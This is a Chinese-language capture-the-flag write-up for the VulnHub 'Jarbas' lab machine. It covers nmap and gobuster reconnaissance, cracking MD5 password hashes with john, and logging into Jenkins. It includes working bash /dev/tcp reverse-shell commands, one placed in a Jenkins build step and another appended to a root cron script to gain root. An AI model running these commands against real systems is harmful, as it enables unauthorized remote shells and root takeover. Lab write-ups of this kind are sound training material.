# Jarbas主机渗透实现

靶机地址：https://www.vulnhub.com/entry/jarbas-1,232/

下载地址：https://download.vulnhub.com/jarbas/Jarbas.zip

## 信息收集：

### 主机发现

```shell
# 设置目标机网段为：192.168.6.1
└─$ nmap -sn 192.168.6.1/24         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 22:24 HKT
Nmap scan report for 192.168.6.1
Host is up (0.00098s latency).
Nmap scan report for 192.168.6.2
Host is up (0.0013s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 6.94 seconds

```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口扫描

```shell
# 扫描TCP端口
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.6.2 -oA Scan/sT
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 22:27 HKT
Nmap scan report for 192.168.6.2
Host is up (0.032s latency).
Not shown: 61682 filtered tcp ports (no-response), 226 filtered tcp ports (host-unreach), 3623 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 37.85 seconds


# 扫描UDP端口
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.6.2 -oA Scan/sU  
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 22:27 HKT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.11 seconds

```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描
5.   `-oA`  将当前扫描出的内容保存到指定文件中

### 服务扫描系统探测

```shell
└─$ sudo nmap -sC -sV -O -p22,80,3306,8080 --min-rate 10000 192.168.6.2 -oA Scan/sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 22:29 HKT
Nmap scan report for 192.168.6.2
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28bc493c6c4329573cb8859a6d3c163f (RSA)
|   256 a01b902cda79eb8f3b14debb3fd2e73f (ECDSA)
|_  256 57720854b756ffc3e6166f97cfae7f76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Jarbas - O Seu Mordomo Virtual!
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 (99%), Linux 4.4 (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Actiontec MI424WR-GEN3I WAP (96%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (92%), BlueArc Titan 2100 NAS device (92%), Microsoft Windows XP SP3 (91%), VMware Player virtual NAT device (90%), TiVo series 1 (Sony SVR-2000 or Philips HDR112) (Linux 2.1.24-TiVo-2.5, PowerPC) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
```

参数讲解：

1.   `-sV` 探测当前的服务版本
2.   `-sC` 调用默认的脚本进行漏洞探测
3.   `-O` 探测目标操作系统版本
4.   `-p `  指定端口进行扫描

### 默认漏洞脚本扫描

```shell
└─$ sudo nmap --script=vuln -p22,80,3389,8080 192.168.6.2 -oA Scan/script-scan 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 22:32 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.6.2
Host is up (0.00048s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-dombased-xss: Couldn't find any DOM based XSS.
3389/tcp closed ms-wbt-server
8080/tcp open   http-proxy
| http-enum: 
|_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 58.66 seconds

```

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

### web目录扫描

调用`gobuster`进行扫描

```shell
# 扫描80端口
└─$ sudo gobuster dir -u http://192.168.6.2/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.6.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/17 09:36:01 Starting gobuster in directory enumeration mode
===============================================================
Progress: 220207 / 220561 (99.84%)
===============================================================
2023/05/17 09:37:04 Finished
===============================================================

# 并为发现有效的目录，尝试根据文件类型进行扫描

```

 -    指定文件类型进行扫描

 -    >   sudo robuster dir -u http://192.168.6.2/ -x txt.html.asp,php,jsp,zip,tar -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

 -    ![image-20230517095944914](https://raw.githubusercontent.com/r0o983/images/main/image-20230517095944914.png)

      -    发现了一个`access.html`文件。 

      -    ![image-20230517100024429](https://raw.githubusercontent.com/r0o983/images/main/image-20230517100024429.png)

      -    使用md5工具进行尝试解密

      -    ```shell
           tiago:5978a63b4654c73c60fa24f836386d87
           trindade:f463f63616cb3f1e81ce46b39f882fd5
           eder:9b38e2b1e8b12f426b0d208a7ab6cb98
           ```

      -    >   └─$ john --format=Raw-MD5 hash
           >
           >   参数：
           >
           >   --format=Raw-MD5 指定使用md5来进行破解

      -    ```shell
           └─$ john --format=Raw-MD5 hash
           Using default input encoding: UTF-8
           Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
           Warning: no OpenMP support for this hash type, consider --fork=4
           Proceeding with single, rules:Single
           Press 'q' or Ctrl-C to abort, almost any other key for status
           Warning: Only 9 candidates buffered for the current salt, minimum 12 needed for performance.
           Almost done: Processing the remaining buffered candidate passwords, if any.
           Proceeding with wordlist:/usr/share/john/password.lst
           Proceeding with incremental:ASCII
           marianna         (trindade)     
           vipsu            (eder)     
           italia99         (tiago)     
           3g 0:00:02:11 DONE 3/3 (2023-05-23 10:35) 0.02280g/s 38733Kp/s 38733Kc/s 40107KC/s italia03..italiela
           Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
           Session completed.
           ```
      
      -    ![image-20230517100111935](https://raw.githubusercontent.com/r0o983/images/main/image-20230517100111935.png)
      
      -    成功进入后台`http://192.168.6.2:8080/`
      
      -    ![image-20230517100612624](https://raw.githubusercontent.com/r0o983/images/main/image-20230517100612624.png)
      
      1.   创建一个新项目
      
      2.   --》点击build选择需要执行的命令，这里的操作系统为Linux，所以选择`execute shell`,写入shell
      
      3.   ![image-20230517104450030](https://raw.githubusercontent.com/r0o983/images/main/image-20230517104450030.png)
      
      4.   >   /bin/bash -i >& /dev/tcp/192.168.8.128/6666 0>&1  # 不要在意这里的IP地址变了，因为换了网段
      
      5.   在本地起一个监听，等待连接`nc -nvlp 6666`
      
      6.   获得初始权限的shell
      
      7.   ```shell
           └─$ nc -nvlp 6666
           listening on [any] 6666 ...
           connect to [192.168.2.128] from (UNKNOWN) [192.168.2.129] 47938
           bash: no job control in this shell
           bash-4.2$ whoami
           whoami
           jenkins
           
           ```
      
      8.   查看是否有定时任务：` cat /etc/crontab`
      
      9.   ```shell
           bash-4.2$ cat /etc/crontab
           cat /etc/crontab
           SHELL=/bin/bash
           PATH=/sbin:/bin:/usr/sbin:/usr/bin
           MAILTO=root
           
           # For details see man 4 crontabs
           
           # Example of job definition:
           # .---------------- minute (0 - 59)
           # |  .------------- hour (0 - 23)
           # |  |  .---------- day of month (1 - 31)
           # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
           # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
           # |  |  |  |  |
           # *  *  *  *  * user-name  command to be executed
           */5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
           bash-4.2$ 
           
           # 查看定时任务中的内容
           bash-4.2$ cat /etc/script/CleaningScript.sh 
           cat /etc/script/CleaningScript.sh 
           #!/bin/bash
           
           rm -rf /var/log/httpd/access_log.txt
           bash-4.2$ 
           
           ```
      
      10.   修改或增加定时任务中的内容：
      
      11.   >   bash-4.2$ echo "/bin/bash -i >& /dev/tcp/192.168.2.128/1234 0>&1" >> /etc/script/CleaningScript.sh 
      
      12.   获得root权限：
      
      13.   ![image-20230517133205961](https://raw.githubusercontent.com/r0o983/images/main/image-20230517133205961.png)



